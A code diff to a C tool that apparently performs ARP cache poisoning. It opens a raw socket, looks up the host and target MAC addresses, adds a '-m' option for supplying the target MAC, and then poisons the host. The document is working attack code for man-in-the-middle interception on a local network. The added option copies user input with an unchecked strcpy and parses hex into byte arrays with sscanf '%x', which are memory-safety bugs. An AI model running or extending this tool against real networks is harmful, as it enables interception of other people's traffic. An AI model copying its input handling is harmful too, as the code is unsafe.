@@ -26,12 +26,12 @@ void print_usage(char *pname);
 
 int main(int argc, char *argv[]) {
     char dev[IFNAMSIZ];
-    char our_m_str[MACSLEN], target_m_str[MACSLEN], host_m_str[MACSLEN];    
+    char our_m_str[MACSLEN], target_m_str[MACSLEN] = {0}, host_m_str[MACSLEN];    
     char our_ip_str[IPSLEN], host_str[IPSLEN], target_str[IPSLEN];
     struct ifreq ifreq_i, ifreq_c, ifreq_ip;
     uint8_t our_ip[IP_ALEN], host_ip[IP_ALEN], target_ip[IP_ALEN];
     int sock; 
-    unsigned char our_mac[ETH_ALEN], target_mac[ETH_ALEN], host_mac[ETH_ALEN];
+    unsigned char our_mac[ETH_ALEN], target_mac[ETH_ALEN] = {0}, host_mac[ETH_ALEN];
 
     // create raw socket
     if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
@@ -56,7 +56,7 @@ int main(int argc, char *argv[]) {
  
     int dev_from_arg, op;
     dev_from_arg = op = 0;
-    while ((op = getopt(argc, argv, "i:t:h:n:")) != FAIL) {
+    while ((op = getopt(argc, argv, "i:t:h:n:m:")) != FAIL) {
         switch (op) {
 
             case 'i':
@@ -92,6 +92,19 @@ int main(int argc, char *argv[]) {
                 num_packets = atoi(optarg);
                 break;
 
+            case 'm':
+                // mac address option
+                strcpy(target_m_str, optarg);
+                puts(target_m_str);
+                sscanf(target_m_str, "%x:%x:%x:%x:%x:%x", 
+                        &target_mac[0], 
+                        &target_mac[1], 
+                        &target_mac[2], 
+                        &target_mac[3], 
+                        &target_mac[4],
+                        &target_mac[5]);
+                break;
+
             default:
                 print_usage(argv[0]);
                 exit(1);
@@ -100,7 +113,7 @@ int main(int argc, char *argv[]) {
     }
 
     // check args
-    if(t_sufix == 0) {
+    if (t_sufix == 0) {
         fprintf(stderr, "Must provide target IP sufix\n");
         print_usage(argv[0]);
         exit(1);
@@ -129,7 +142,6 @@ int main(int argc, char *argv[]) {
             our_ip[2],
             our_ip[3]); 
 
-
     // save, parse, and check host/target IP's
     memcpy(target_ip, our_ip, IP_ALEN);
     memcpy(host_ip, our_ip, IP_ALEN);
@@ -147,6 +159,26 @@ int main(int argc, char *argv[]) {
         exit(1);
     }
 
+    struct ether_arp *arp;
+    if (target_m_str[0] == 0) {
+
+        // send request for target MAC
+        send_arp(sock, ifreq_i.ifr_ifindex,
+                our_mac,        // eth source mac
+                broadcast,      // eth dest mac
+                our_mac,        // arp source mac
+                empty,          // arp dest mac
+                our_ip,         // arp source ip
+                target_ip,      // arp dest ip
+                ARPOP_REQUEST); // opcode
+
+        // get target MAC from reply
+        arp = recv_arp(sock, ARPOP_REPLY, target_ip);
+        memcpy(target_mac, arp->arp_sha, ETH_ALEN);
+        mac_to_str(target_m_str, target_mac);
+    }
+
+
     // send request for host MAC
     send_arp(sock, ifreq_i.ifr_ifindex,
             our_mac,        // eth source mac
@@ -158,25 +190,10 @@ int main(int argc, char *argv[]) {
             ARPOP_REQUEST); // opcode
 
     // get host MAC from reply
-    
-    struct ether_arp *arp = recv_arp(sock, ARPOP_REPLY, host_ip);
+    arp = recv_arp(sock, ARPOP_REPLY, host_ip);
     memcpy(host_mac, arp->arp_sha, ETH_ALEN);
     mac_to_str(host_m_str, host_mac);
 
-    // send request for target MAC
-    send_arp(sock, ifreq_i.ifr_ifindex,
-            our_mac,        // eth source mac
-            broadcast,      // eth dest mac
-            our_mac,        // arp source mac
-            empty,          // arp dest mac
-            our_ip,         // arp source ip
-            target_ip,      // arp dest ip
-            ARPOP_REQUEST); // opcode
-
-    // get target MAC from reply
-    arp = recv_arp(sock, ARPOP_REPLY, target_ip);
-    memcpy(target_mac, arp->arp_sha, ETH_ALEN);
-    mac_to_str(target_m_str, target_mac);
 
     // poison host
     printf("Poisoning host...\n");
